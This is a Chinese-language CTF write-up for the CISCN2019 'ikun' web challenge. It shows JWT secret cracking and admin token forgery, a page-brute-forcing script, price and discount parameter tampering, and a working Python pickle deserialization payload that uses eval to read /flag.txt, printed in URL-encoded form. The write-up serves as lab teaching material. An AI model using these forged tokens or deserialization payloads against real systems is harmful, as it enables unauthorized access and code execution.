# \[CISCN2019 华北赛区 Day1 Web2]ikun

## \[CISCN2019 华北赛区 Day1 Web2]ikun

## 考点

* JWT
* 逻辑漏洞
* tornado代码审计
* pickle反序列化

## wp

注册登录，提示剩余金额1000，并且在cookie中有JWT字段

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYWEifQ.bJejEdbt0h9U-vvnfoUAF7JFOPy0o6LqHQnITMhYL2I
```

在[jwt.io](https://jwt.io)上看一下，提示需要密钥

![](<../../.gitbook/assets/image (13).png>)

可以使用[`jwtcrack`](https://github.com/brendan-rius/c-jwt-cracker)破解密钥，结果是1Kun，username改成admin，重新生成JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

回到个人中心，可以看到提示

![](<../../.gitbook/assets/image (12) (1).png>)

```
>>> s='\\u8fd9\\u7f51\\u7ad9\\u4e0d\\u4ec5\\u53ef\\u4ee5\\u4ee5\\u8585\\u7f8a\\u6bdb\\uff0c\\u6211\\u8fd8\\u7559\\u4e86\\u4e2a\\u540e\\u95e8\\uff0c\\u5c31\\u85cf\\u5728\\u006c\\u0076\\u0036\\u91cc'
>>> s.encode('utf8').decode('unicode_escape')
'这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里'
```

然后找lv6在哪儿，写爬虫爆破，在181页

```php
import requests

url = 'http://d34fe1a5-ca55-4b0b-9f8e-52d8f8a89f48.node4.buuoj.cn:81/shop?page=2'

for i in range(1,999999):
    url = f'http://d34fe1a5-ca55-4b0b-9f8e-52d8f8a89f48.node4.buuoj.cn:81/shop?page={str(i)}'
    r = requests.get(url)
    if '/static/img/lv/lv6' in r.text:
        print(url)
        break
```

![](<../../.gitbook/assets/image (16).png>)

给的钱不够，应该是个逻辑漏洞，抓包看看，在结算的时候，有个折扣的参数，这里是打了8折

![](<../../.gitbook/assets/image (9).png>)

把price和discount都改成很低，看到返回了一个地址：`/b1g_m4mber`

![](<../../.gitbook/assets/image (7).png>)

直接访问可以看到提示，给了源码

![](<../../.gitbook/assets/image (11).png>)

`static/asd1f654e683wq/www.zip`下载源码，直接找路由吧，在`sshop/views/__init__.py`文件下

```python
handlers = [
    (r'/', ShopIndexHandler),
    (r'/shop', ShopListHandler),
    (r'/info/(\d+)', ShopDetailHandler),
    (r'/shopcar', ShopCarHandler),
    (r'/shopcar/add', ShopCarAddHandler),
    (r'/pay', ShopPayHandler),
    (r'/user', UserInfoHandler),
    (r'/user/change', changePasswordHandler),
    (r'/pass/reset', ResetPasswordHanlder),
    (r'/login', UserLoginHanlder),
    (r'/logout', UserLogoutHandler),
    (r'/register', RegisterHandler),
    (r'/b1g_m4mber', AdminHandler)
]
```

发现在`AdminHandler`中调用了`pickle.loads`，由此切入

```php
class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

`pickle.loads`把字符串转换成对象，`get_argument`用于获取GET或POST的参数，`urllib.unquote`是python2的用法，然后就可以构造pickle反序列化了

```python
# python2
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```

得到结果

```
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

回到`/b1g_m4mber`，把输入框的`hidden`删掉

![](<../../.gitbook/assets/image (6).png>)

提交payload

![](<../../.gitbook/assets/image (10).png>)

结果

![](<../../.gitbook/assets/image (12).png>)

## 小结

1. 破解JWT的密钥可以使用[jwtcrack](https://github.com/brendan-rius/c-jwt-cracker)，在kali中使用
